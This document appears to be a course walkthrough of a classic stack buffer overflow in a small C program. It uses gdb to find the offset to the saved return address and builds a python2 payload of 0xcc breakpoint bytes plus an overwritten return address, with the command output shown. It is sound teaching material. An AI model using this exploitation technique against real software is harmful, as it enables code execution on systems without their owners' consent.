# Stack Overflow Walkthrough

## Vulnerability

In this [program](main.c), the vulnerability is straightforward -- the invocation
of `strcpy` in `f` copies `input` into the stack buffer `buf` without checking
whether the length of `input` exceeds the length of `buf`, leading to a potential
overflow since `input` is untrusted (`argv[1]` in `main`).

## Exploitation

The first step is to determine how long of an input is required to overwrite the
saved instruction pointer on the stack for the return to `main`.  Note that even
though the size of `buf` is 256 bytes (and so in principle the distance should be
256 + 8 bytes (saved ebp) + 8 bytes (to overwrite the saved eip)), this distance
varies in practice due to issues like stack alignment, register spilling, etc.

So, the most reliable way to determine the required distance is to use gdb as
below (note that the addresses you see will most likely be a little different):

```
# Launch gdb on the vulnerable program
$ gdb main

# Set a breakpoint at f
(gdb) b f
Breakpoint 1 at 0x400560: file main.c, line 6.

# Run the program
(gdb) r AAAA
Starting program: /home/wkr/host/Devel/Class/SoftVulnSec/Examples/stack/main AAAA
Breakpoint 1, f (input=0x7fffffffe6f3 "AAAA") at main.c:6
6       strcpy(buf, input);

# Print the address of buf
(gdb) p &buf
$1 = (char (*)[256]) 0x7fffffffe270

# Examine the top of the current frame
(gdb) x/2xg $rbp
0x7fffffffe380: 0x00007fffffffe3a0  0x00000000004005d3

# Notice that the return address back to main is 0x4005d3,
# and starts at 0x7fffffffe388
(gdb) bt
#0  f (input=0x7fffffffe6f3 "AAAA") at main.c:6
#1  0x00000000004005d3 in main (argc=2, argv=0x7fffffffe488) at main.c:12

# So, we need to send 0x118 bytes to reach the return address
(gdb) p/x 0x7fffffffe388 - 0x7fffffffe270
$2 = 0x118
(gdb)
```

So, we've found that our payload needs to be 0x118 bytes long, and after that
section of the payload we can set an arbitrary return address.  Let's try
to inject a simple payload that returns to a buffer of breakpoint instructions
(`int3`, or 0xcc bytes).

```
# Run the program with an argument length we will send to recheck the
# address of buf (0x118 + 8 = 0x120)
(gdb) r "$(python2 -c 'print "A" * 0x120')"
Starting program: /home/wkr/host/Devel/Class/SoftVulnSec/Examples/stack/main "$(python2 -c 'print "A" * 0x120')"
Breakpoint 1, f (input=0x7fffffffe5d7 'A' <repeats 200 times>...) at main.c:6
6       strcpy(buf, input);
(gdb) p &buf
$5 = (char (*)[256]) 0x7fffffffe150

# Run the program again with a return to a buffer of breakpoints
(gdb) r "$(python2 -c 'print ("\xcc" * 0x118) + "\x50\xe1\xff\xff\xff\x7f\x00\x00"')"
Starting program: /home/wkr/host/Devel/Class/SoftVulnSec/Examples/stack/main "$(python2 -c 'print ("\xcc" * 0x118) + "\x50\xe1\xff\xff\xff\x7f\x00\x00"')"
Breakpoint 1, f (
    input=0x7fffffffe5d9 '\314' <repeats 199 times>, <incomplete sequence \314>...)
    at main.c:6
6       strcpy(buf, input);
(gdb) c
Continuing.
Program received signal SIGTRAP, Trace/breakpoint trap.
0x00007fffffffe151 in ?? ()
```

At this point, we have all the information we need.  The
[exploit script](exploit.py) uses the example payload compiled from
[payload.asm](payload.asm), appends the proper number of NOP instructions
to reach 0x118 bytes, and then appends the return address that you found
using gdb.
